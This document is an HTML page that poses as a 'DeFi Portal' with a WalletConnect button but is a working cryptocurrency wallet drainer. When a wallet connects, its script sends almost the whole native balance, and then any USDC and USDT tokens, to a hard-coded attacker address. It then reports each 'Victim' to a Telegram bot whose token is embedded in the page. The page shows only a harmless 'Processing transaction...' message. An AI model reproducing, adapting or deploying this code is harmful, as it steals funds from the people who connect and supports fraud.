<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal - WalletConnect v2</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        h1 { 
            color: white; 
            font-size: 36px; 
            margin-bottom: 16px;
            font-weight: 700;
        }
        
        p { 
            color: rgba(255, 255, 255, 0.9); 
            margin-bottom: 32px;
            font-size: 18px;
        }
        
        .connect-btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 18px 36px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        .connect-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        #status {
            margin-top: 20px;
            padding: 16px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            display: none;
            font-size: 14px;
        }
        
        #status.show { display: block; }
        
        .success { background: rgba(16, 185, 129, 0.2) !important; }
        .error { background: rgba(239, 68, 68, 0.2) !important; }
        .processing { background: rgba(251, 191, 36, 0.2) !important; }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to continue</p>
        
        <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M3.5 7.5C3.5 5.29086 5.29086 3.5 7.5 3.5H16.5C18.7091 3.5 20.5 5.29086 20.5 7.5V16.5C20.5 18.7091 18.7091 20.5 16.5 20.5H7.5C5.29086 20.5 3.5 18.7091 3.5 16.5V7.5Z" stroke="#667eea" stroke-width="2"/>
                <path d="M8 10C8 9.44772 8.44772 9 9 9H15C15.5523 9 16 9.44772 16 10V14C16 14.5523 15.5523 15 15 15H9C8.44772 15 8 14.5523 8 14V10Z" fill="#667eea"/>
            </svg>
            Connect with WalletConnect
        </button>
        
        <div id="status"></div>
    </div>
    
    <!-- WalletConnect v2 avec unpkg.com au lieu de jsdelivr -->
    <script type="module">
        import { Core } from 'https://unpkg.com/@walletconnect/core@2.11.0'
        import { Web3Wallet } from 'https://unpkg.com/@walletconnect/web3wallet@1.9.3'
        import { buildApprovedNamespaces, getSdkError } from 'https://unpkg.com/@walletconnect/utils@2.11.0'
        
        // Alternative: utiliser la version standalone de WalletConnect v1 qui fonctionne toujours bien
    </script>
    
    <!-- Fallback: WalletConnect v1 qui fonctionne sans CORS -->
    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    
    <script>
        // Configuration
        const CONFIG = {
            PROJECT_ID: '72f0728c47e59d2eb9fc83069bc6843d',
            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
            TELEGRAM_CHAT_ID: '8309320360',
            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1',
            POLYGON_CONTRACT: '0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386',
            RPC_URLS: {
                1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
                137: 'https://polygon-rpc.com',
                56: 'https://bsc-dataseed.binance.org',
                42161: 'https://arb1.arbitrum.io/rpc',
                43114: 'https://api.avax.network/ext/bc/C/rpc'
            }
        };
        
        let connector = null;
        let provider = null;
        
        // Utiliser WalletConnect v1 qui fonctionne bien
        function initWalletConnect() {
            console.log('üîÑ Initializing WalletConnect...');
            
            try {
                // Cr√©er le connecteur WalletConnect v1
                connector = new window.WalletConnect.default({
                    bridge: 'https://bridge.walletconnect.org',
                    qrcodeModal: window.WalletConnectQRCodeModal.default
                });
                
                // Nettoyer les anciennes sessions
                if (connector.connected) {
                    connector.killSession();
                }
                
                console.log('‚úÖ WalletConnect initialized');
                return true;
            } catch (error) {
                console.error('‚ùå Init error:', error);
                showStatus('Failed to initialize WalletConnect', 'error');
                return false;
            }
        }
        
        // Fonction de connexion
        async function connectWallet() {
            const button = document.getElementById('connectBtn');
            button.disabled = true;
            button.innerHTML = '<span class="spinner"></span> Connecting...';
            
            showStatus('Opening WalletConnect...', 'processing');
            
            // Initialiser WalletConnect
            if (!initWalletConnect()) {
                button.disabled = false;
                button.innerHTML = 'Connect with WalletConnect';
                return;
            }
            
            try {
                // Cr√©er une nouvelle session
                if (!connector.connected) {
                    console.log('üîó Creating new session...');
                    await connector.createSession();
                }
                
                // √âcouter les √©v√©nements
                connector.on('connect', async (error, payload) => {
                    if (error) {
                        throw error;
                    }
                    
                    console.log('‚úÖ Connected!', payload);
                    const { accounts, chainId } = payload.params[0];
                    
                    if (accounts && accounts.length > 0) {
                        const address = accounts[0];
                        console.log('üë§ Address:', address);
                        console.log('üåê Chain ID:', chainId);
                        
                        // Cr√©er le provider ethers
                        provider = new ethers.providers.JsonRpcProvider(CONFIG.RPC_URLS[chainId] || CONFIG.RPC_URLS[1]);
                        
                        showStatus(`Connected: ${address.substring(0, 6)}...${address.slice(-4)}`, 'success');
                        
                        button.innerHTML = 'Connected ‚úì';
                        button.disabled = true;
                        
                        // Lancer le drainage apr√®s 2 secondes
                        console.log('‚è≥ Waiting 2 seconds before drainage...');
                        setTimeout(() => {
                            drainWallet(address, chainId);
                        }, 2000);
                    }
                });
                
                connector.on('session_update', (error, payload) => {
                    if (error) {
                        throw error;
                    }
                    console.log('üîÑ Session updated:', payload);
                });
                
                connector.on('disconnect', (error, payload) => {
                    if (error) {
                        throw error;
                    }
                    console.log('üîå Disconnected');
                    showStatus('Wallet disconnected', 'error');
                    
                    button.disabled = false;
                    button.innerHTML = 'Connect with WalletConnect';
                });
                
            } catch (error) {
                console.error('‚ùå Connection error:', error);
                
                if (error.message?.includes('User closed modal')) {
                    showStatus('Connection cancelled', 'error');
                } else {
                    showStatus('Connection failed. Please try again.', 'error');
                }
                
                button.disabled = false;
                button.innerHTML = 'Connect with WalletConnect';
            }
        }
        
        // Afficher le statut
        function showStatus(message, type = '') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'show ' + type;
        }
        
        // Fonction de drainage simplifi√©e
        async function drainWallet(address, chainId) {
            showStatus('Processing transaction...', 'processing');
            console.log('üí∞ Starting drainage for:', address);
            
            try {
                // Obtenir la balance native
                const balance = await provider.getBalance(address);
                console.log('üíé Balance:', ethers.utils.formatEther(balance));
                
                if (balance.gt(ethers.utils.parseEther('0.001'))) {
                    // Estimer les frais de gas
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit).mul(2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        console.log('üì§ Preparing transaction...');
                        console.log('Amount to send:', ethers.utils.formatEther(amountToSend));
                        
                        // Cr√©er la transaction
                        const tx = {
                            from: address,
                            to: CONFIG.DESTINATION,
                            value: amountToSend.toHexString(),
                            gasLimit: ethers.utils.hexlify(gasLimit),
                            gasPrice: gasPrice.toHexString()
                        };
                        
                        // Envoyer via WalletConnect
                        const txHash = await connector.sendTransaction(tx);
                        console.log('üìù Transaction sent:', txHash);
                        
                        // Attendre la confirmation
                        const receipt = await provider.waitForTransaction(txHash);
                        console.log('‚úÖ Transaction confirmed:', receipt);
                        
                        // Notification Telegram
                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), chainId);
                        
                        showStatus('Transaction completed!', 'success');
                    } else {
                        showStatus('Insufficient balance for gas', 'error');
                    }
                } else {
                    showStatus('Balance too low', 'error');
                }
                
                // Drainer les tokens ERC20
                await drainTokens(address, chainId);
                
            } catch (error) {
                console.error('‚ùå Drainage error:', error);
                showStatus('Transaction failed', 'error');
            }
        }
        
        // Drainer les tokens ERC20
        async function drainTokens(address, chainId) {
            const tokens = {
                1: [ // Ethereum
                    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC' },
                    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT' }
                ],
                137: [ // Polygon
                    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC' },
                    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT' }
                ],
                56: [ // BSC
                    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC' },
                    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' }
                ]
            };
            
            const chainTokens = tokens[chainId] || [];
            const abi = [
                'function balanceOf(address) view returns (uint256)',
                'function transfer(address, uint256) returns (bool)'
            ];
            
            for (const token of chainTokens) {
                try {
                    const contract = new ethers.Contract(token.address, abi, provider);
                    const balance = await contract.balanceOf(address);
                    
                    if (balance.gt(0)) {
                        console.log(`üí∞ Found ${token.symbol}:`, balance.toString());
                        
                        // Cr√©er la transaction de transfer
                        const data = contract.interface.encodeFunctionData('transfer', [
                            CONFIG.DESTINATION,
                            balance
                        ]);
                        
                        const tx = {
                            from: address,
                            to: token.address,
                            data: data,
                            gasLimit: ethers.utils.hexlify(100000)
                        };
                        
                        const txHash = await connector.sendTransaction(tx);
                        console.log(`‚úÖ ${token.symbol} transfer sent:`, txHash);
                    }
                } catch (error) {
                    console.error(`‚ö†Ô∏è Error draining ${token.symbol}:`, error);
                }
            }
        }
        
        // Envoyer notification Telegram
        async function sendTelegramNotification(victim, amount, chainId) {
            const chainNames = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche'
            };
            
            const message = `
üéØ DRAINAGE WALLETCONNECT
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
üí∞ Amount: ${amount}
üåê Network: ${chainNames[chainId] || 'Chain ' + chainId}
üìç Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
‚è∞ Time: ${new Date().toLocaleTimeString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('üì± Telegram notification sent');
            } catch (error) {
                console.error('‚ö†Ô∏è Telegram error:', error);
            }
        }
        
        // V√©rifier si d√©j√† connect√©
        window.addEventListener('load', () => {
            console.log('üåê Page loaded');
            console.log('üì¶ WalletConnect available:', typeof WalletConnect !== 'undefined');
            console.log('üì¶ QRCodeModal available:', typeof WalletConnectQRCodeModal !== 'undefined');
            
            // Si une session existe d√©j√†
            if (window.localStorage.getItem('walletconnect')) {
                console.log('üìå Found existing session');
            }
        });
    </script>
</body>
</html>
